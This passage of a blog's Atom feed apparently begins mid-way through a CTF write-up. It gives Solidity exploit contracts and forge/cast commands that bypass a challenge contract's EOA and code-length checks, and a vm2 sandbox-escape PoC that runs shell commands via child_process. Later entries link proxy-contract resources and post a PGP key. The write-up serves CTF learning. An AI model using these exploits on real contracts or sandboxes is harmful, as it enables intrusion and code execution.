&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;selfdestruct&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;payable&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;)));
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;    fallback() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;external &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        emit &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;fallback_called&lt;&#x2F;span&gt;&lt;span&gt;();
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;Challenge&lt;&#x2F;span&gt;&lt;span&gt;(_challenge).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;cheat&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0x1337&lt;&#x2F;span&gt;&lt;span&gt;));
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;Challenge &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    mapping (&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span&gt;=&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint256&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public&lt;&#x2F;span&gt;&lt;span&gt; secret;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bool public&lt;&#x2F;span&gt;&lt;span&gt; privileged;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bool public&lt;&#x2F;span&gt;&lt;span&gt; isSolved;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint256 constant&lt;&#x2F;span&gt;&lt;span&gt; trustedCodeLength &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0x8&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    error &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;NotEOA&lt;&#x2F;span&gt;&lt;span&gt;();
&lt;&#x2F;span&gt;&lt;span&gt;    error &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;Not1337&lt;&#x2F;span&gt;&lt;span&gt;();
&lt;&#x2F;span&gt;&lt;span&gt;    error &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;NotSuccess&lt;&#x2F;span&gt;&lt;span&gt;();
&lt;&#x2F;span&gt;&lt;span&gt;    error &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;NotTrusted&lt;&#x2F;span&gt;&lt;span&gt;();
&lt;&#x2F;span&gt;&lt;span&gt;    error &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;Privileged&lt;&#x2F;span&gt;&lt;span&gt;();
&lt;&#x2F;span&gt;&lt;span&gt;    error &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;NotPrivileged&lt;&#x2F;span&gt;&lt;span&gt;();
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;vulnerable&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span&gt;untrusted) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        if (untrusted.code.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;length &amp;gt;&lt;&#x2F;span&gt;&lt;span&gt; trustedCodeLength) revert &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;NotTrusted&lt;&#x2F;span&gt;&lt;span&gt;();
&lt;&#x2F;span&gt;&lt;span&gt;        privileged &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= true&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        (&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bool&lt;&#x2F;span&gt;&lt;span&gt; success,) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; untrusted.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;call&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;        if (&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;!&lt;&#x2F;span&gt;&lt;span&gt; success) revert &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;NotSuccess&lt;&#x2F;span&gt;&lt;span&gt;();
&lt;&#x2F;span&gt;&lt;span&gt;        privileged &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= false&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;cheat&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint &lt;&#x2F;span&gt;&lt;span&gt;password) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        if (&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;!&lt;&#x2F;span&gt;&lt;span&gt; privileged) revert &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;NotPrivileged&lt;&#x2F;span&gt;&lt;span&gt;();
&lt;&#x2F;span&gt;&lt;span&gt;        secret[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;msg&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;sender&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; password;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;sendFlag&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        if (privileged) revert &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;Privileged&lt;&#x2F;span&gt;&lt;span&gt;();
&lt;&#x2F;span&gt;&lt;span&gt;        if (&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;msg&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;sender&lt;&#x2F;span&gt;&lt;span&gt;.code.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;length != &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;) revert &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;NotEOA&lt;&#x2F;span&gt;&lt;span&gt;();
&lt;&#x2F;span&gt;&lt;span&gt;        if (secret[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;msg&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;sender&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;!= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0x1337&lt;&#x2F;span&gt;&lt;span&gt;) revert &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;Not1337&lt;&#x2F;span&gt;&lt;span&gt;();
&lt;&#x2F;span&gt;&lt;span&gt;        isSolved &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= true&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;solve1 &lt;&#x2F;span&gt;&lt;span&gt;is &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;Script &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;run&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        vm.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;startBroadcast&lt;&#x2F;span&gt;&lt;span&gt;();
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt; a &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= address&lt;&#x2F;span&gt;&lt;span&gt;(new &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;main&lt;&#x2F;span&gt;&lt;span&gt;());
&lt;&#x2F;span&gt;&lt;span&gt;        console.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(a);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;forge&lt;&#x2F;span&gt;&lt;span&gt; script solve1 --rpc-url http:&#x2F;&#x2F;43.156.79.241:40545&#x2F;pDGRwGGYtWVxbbJuHFIbeiHp&#x2F;geekctf --private-key 0xcdd09fc8029af5e6f96620fa13fddab847a27408abc7bfd111c099495ec1a5f7 --broadcast
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;cast&lt;&#x2F;span&gt;&lt;span&gt; send 0xBF0a32b047184697a2E38a455B6321125611e26B --rpc-url http:&#x2F;&#x2F;43.156.79.241:40545&#x2F;pDGRwGGYtWVxbbJuHFIbeiHp&#x2F;geekctf &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;make_number()&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt; --private-key 0xcdd09fc8029af5e6f96620fa13fddab847a27408abc7bfd111c099495ec1a5f7
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;cast&lt;&#x2F;span&gt;&lt;span&gt; block-number --rpc-url http:&#x2F;&#x2F;43.156.79.241:40545&#x2F;pDGRwGGYtWVxbbJuHFIbeiHp&#x2F;geekctf
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;# repeat this these two steps until block-number == 30 to make step2() mined on block32 and excuted successfully
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;cast&lt;&#x2F;span&gt;&lt;span&gt; send 0xBF0a32b047184697a2E38a455B6321125611e26B --rpc-url http:&#x2F;&#x2F;43.156.79.241:40545&#x2F;pDGRwGGYtWVxbbJuHFIbeiHp&#x2F;geekctf &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;step_1()&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt; --private-key 0xcdd09fc8029af5e6f96620fa13fddab847a27408abc7bfd111c099495ec1a5f7
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;cast&lt;&#x2F;span&gt;&lt;span&gt; send 0xBF0a32b047184697a2E38a455B6321125611e26B --rpc-url http:&#x2F;&#x2F;43.156.79.241:40545&#x2F;pDGRwGGYtWVxbbJuHFIbeiHp&#x2F;geekctf &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;step_2()&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt; --private-key 0xcdd09fc8029af5e6f96620fa13fddab847a27408abc7bfd111c099495ec1a5f7
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;cast&lt;&#x2F;span&gt;&lt;span&gt; send 0xBF0a32b047184697a2E38a455B6321125611e26B --rpc-url http:&#x2F;&#x2F;43.156.79.241:40545&#x2F;pDGRwGGYtWVxbbJuHFIbeiHp&#x2F;geekctf &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;step_3()&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt; --private-key 0xcdd09fc8029af5e6f96620fa13fddab847a27408abc7bfd111c099495ec1a5f7
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;cast&lt;&#x2F;span&gt;&lt;span&gt; send 0xBF0a32b047184697a2E38a455B6321125611e26B --rpc-url http:&#x2F;&#x2F;43.156.79.241:40545&#x2F;pDGRwGGYtWVxbbJuHFIbeiHp&#x2F;geekctf &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;step_4()&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt; --private-key 0xcdd09fc8029af5e6f96620fa13fddab847a27408abc7bfd111c099495ec1a5f7
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;cast&lt;&#x2F;span&gt;&lt;span&gt; call 0xD5Ed7B1be4F1bc62c3790a8E709Cd9D871062062 --rpc-url http:&#x2F;&#x2F;43.156.79.241:40545&#x2F;pDGRwGGYtWVxbbJuHFIbeiHp&#x2F;geekctf &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;isSolved()&amp;quot;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;blockquote&gt;
&lt;p&gt;After communicating with the author, I found that this was an unintended solution.&lt;&#x2F;p&gt;
&lt;p&gt;Originally limited to 8 bytes, the data restriction can be bypassed using delegatecall (missing stack data is filled with zeros). To circumvent the EOA check, either the aforementioned suicide method or a fallback contract during reentrancy can be employed. The fallback contract would call the vulnerable function again in its constructor and subsequently trigger the sendFlag function.&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;h2 id=&quot;escape&quot;&gt;escape&lt;&#x2F;h2&gt;
&lt;p&gt;Because it is node12, the usage of WebAssembly objects and excutor has not been introduced. I searched for changelog but didn’t see much detail about excutor.&lt;&#x2F;p&gt;
&lt;p&gt;You can find another &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;patriksimek&#x2F;vm2&#x2F;issues&#x2F;533#issuecomment-1750654480&quot;&gt;PoC &lt;&#x2F;a&gt;directly in the issue, which is much more elegant than Xion’s PoC. &lt;del&gt;Ah, when will someone write a detailed analysis?&lt;&#x2F;del&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Too lazy to take the console, write directly in stdout&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;javascript&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-javascript &quot;&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;const &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#d8dee9;&quot;&gt;g &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;({})&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;__lookupGetter__&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;const &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#d8dee9;&quot;&gt;a &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;Buffer&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;apply&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;const &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#d8dee9;&quot;&gt;p &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;a&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;apply&lt;&#x2F;span&gt;&lt;span&gt;(g&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fbcbb;&quot;&gt;Buffer&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;__proto__&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;]])&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;const &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#d8dee9;&quot;&gt;_process &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;p&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;call&lt;&#x2F;span&gt;&lt;span&gt;(a)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;constructor&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;return process&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;const &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#d8dee9;&quot;&gt;res &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;_process&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;mainModule&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;require&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;child_process&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;execSync&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;ls &#x2F;&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;_process&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;stdout&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;write&lt;&#x2F;span&gt;&lt;span&gt;(res)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Tricky Contracts Collection</title>
        <published>2024-03-27T21:57:31+08:00</published>
        <updated>2024-03-27T21:57:31+08:00</updated>
        
        <author>
          <name>
            
              Unknown
            
          </name>
        </author>
        
        <link rel="alternate" type="text/html" href="/blog/tricky-contracts/"/>
        <id>/blog/tricky-contracts/</id>
        
        <content type="html" xml:base="/blog/tricky-contracts/">&lt;h3 id=&quot;minimal-proxy-contract&quot;&gt;Minimal Proxy Contract&lt;&#x2F;h3&gt;
&lt;p&gt;https:&#x2F;&#x2F;eips.ethereum.org&#x2F;EIPS&#x2F;eip-1167&lt;&#x2F;p&gt;
&lt;h3 id=&quot;minimal-arbitrary-proxy&quot;&gt;“Minimal” Arbitrary Proxy&lt;&#x2F;h3&gt;
&lt;p&gt;https:&#x2F;&#x2F;mcfx.us&#x2F;posts&#x2F;2022-10-11-minimal-proxy&#x2F;&lt;&#x2F;p&gt;
&lt;h3 id=&quot;smallest-contract&quot;&gt;Smallest Contract&lt;&#x2F;h3&gt;
&lt;p&gt;https:&#x2F;&#x2F;ethereum.stackexchange.com&#x2F;questions&#x2F;40757&#x2F;what-is-the-shortest-bytecode-that-will-publish-a-contract-with-non-zero-bytecod#answer-158733&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Key</title>
        <published>2024-03-21T14:36:49+08:00</published>
        <updated>2024-03-21T14:36:49+08:00</updated>
        
        <author>
          <name>
            
              Unknown
            
          </name>
        </author>
        
        <link rel="alternate" type="text/html" href="/blog/i/key/"/>
        <id>/blog/i/key/</id>
        
        <content type="html" xml:base="/blog/i/key/">&lt;p&gt;&lt;a href=&quot;&#x2F;armored-keys.asc&quot;&gt;Download from this site&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;keyserver.ubuntu.com&#x2F;pks&#x2F;lookup?op=get&amp;amp;search=0x3ee3da5fe284c00871c4e0149cc827bccf14c4a8&quot;&gt;Download from Ubuntu keyserver&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;key&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-key &quot;&gt;&lt;code class=&quot;language-key&quot; data-lang=&quot;key&quot;&gt;&lt;span&gt;-----BEGIN PGP PUBLIC KEY BLOCK-----
&lt;&#x2F;span&gt;&lt;span&gt;Comment: Hostname: 
&lt;&#x2F;span&gt;&lt;span&gt;Version: Hockeypuck 2.1.1-10-gec3b0e7
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;xjMEZTUIRRYJKwYBBAHaRw8BAQdAsRvnt824HBdG9zFw7pEmAv&#x2F;PhfSxifrb0Ajb
&lt;&#x2F;span&gt;&lt;span&gt;MdC0pDnNIFppaGFvIFdhbmcgPGd0ZzI2MTkxMkBnbWFpbC5jb20+wpkEExYKAEEW
&lt;&#x2F;span&gt;&lt;span&gt;IQQ+49pf4oTACHHE4BScyCe8zxTEqAUCZTUIRQIbIwUJA8NOewULCQgHAgIiAgYV
&lt;&#x2F;span&gt;&lt;span&gt;CgkICwIEFgIDAQIeBwIXgAAKCRCcyCe8zxTEqF5lAP96MPcmXhjKqDet4lma&#x2F;H2V
&lt;&#x2F;span&gt;&lt;span&gt;9ZuvhPGiB5roVzg3S0VLygD5AQtprwPFTWSsEMCWtsgQaC&#x2F;hMC2QHbRwKtxDOdnS
&lt;&#x2F;span&gt;&lt;span&gt;kArCdQQQFgoAHRYhBGwxdWfX2u774jMyHqmRLNJYWA53BQJlNQrEAAoJEKmRLNJY
&lt;&#x2F;span&gt;&lt;span&gt;WA53AvoBAOq4yYSRyeaOxLFMLnJmnk6PfDuXtqkw25FNwpwypoYqAP0cDjsk7QNe
&lt;&#x2F;span&gt;&lt;span&gt;lsBaD9BlkhIX6PszqyL0xjL2el5DgLhRAs44BGU1CEUSCisGAQQBl1UBBQEBB0Ce
&lt;&#x2F;span&gt;&lt;span&gt;7JaL+WX7pcmevMI04Zr6NKIk5vqVsi05QG2nuFuPTwMBCAfCfgQYFgoAJhYhBD7j
&lt;&#x2F;span&gt;&lt;span&gt;2l&#x2F;ihMAIccTgFJzIJ7zPFMSoBQJlNQhFAhsMBQkDw057AAoJEJzIJ7zPFMSovSEB
&lt;&#x2F;span&gt;&lt;span&gt;AI2XKocjQ64E3u0MIHFB0jiGfTiQXuckhhjf2DJLVgxCAP9MjirP+DNaPxR1dVRt
&lt;&#x2F;span&gt;&lt;span&gt;oHvZpbVJEnUYNUyCgwDMIQO1AQ==
&lt;&#x2F;span&gt;&lt;span&gt;=Ag7h
&lt;&#x2F;span&gt;&lt;span&gt;-----END PGP PUBLIC KEY BLOCK-----
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Friends &amp;&amp; link</title>
        <published>2024-03-19T20:16:19+08:00</published>
        <updated>2024-03-19T20:16:19+08:00</updated>
        
        <author>
          <name>
            
              Unknown
            
          </name>
        </author>
        
        <link rel="alternate" type="text/html" href="/blog/i/friends/"/>
        <id>/blog/i/friends/</id>
        
        <content type="html" xml:base="/blog/i/friends/">&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;p3ngu1nw &lt;a href=&quot;https:&#x2F;&#x2F;p3ngu1nw.top&#x2F;&quot;&gt;https:&#x2F;&#x2F;p3ngu1nw.top&#x2F;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
